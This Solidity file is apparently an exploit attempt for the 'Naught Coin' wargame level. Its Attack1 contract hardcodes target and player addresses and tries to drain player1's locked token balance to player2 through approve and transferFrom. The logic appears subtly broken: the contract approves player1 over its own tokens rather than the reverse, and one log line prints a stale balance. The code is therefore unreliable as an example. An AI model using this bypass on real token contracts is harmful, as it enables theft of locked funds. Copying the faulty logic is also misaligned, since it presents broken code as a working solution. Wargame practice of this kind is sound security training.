// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "forge-std/console.sol";
import "./naught.sol";
// import 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';
// interface ERC20{
//     function transferFrom(address, address, uint256) external; 
//     function approve(address, uint256) external;
//     function balanceOf(address) external;
// }

contract Attack1 {
    address instance = 0x1EBCebC3b97991a2F865E28d0F60884ba1d1D93d;
    address player1 =  0x3fA68299Fe2AF4ac77260B806c4ffCF4A74Bd28A;
    address player2 = 0x9Ca132EEC5d8b7eeA5fC1DBE7651D5d64cBA65F1;
    NaughtCoin naughtcoin = NaughtCoin(instance);
    function attack1( ) public {
        uint256 balance = naughtcoin.balanceOf(player1);
        console.log("Current balance is: ", balance);
        naughtcoin.approve(player1, balance);
        naughtcoin.allowance(player1, player1);
        naughtcoin.transferFrom(player1, player2, balance);
        console.log("player1 balance is: ", balance);
        console.log("player2 balance is: ", naughtcoin.balanceOf(player2));
    }
}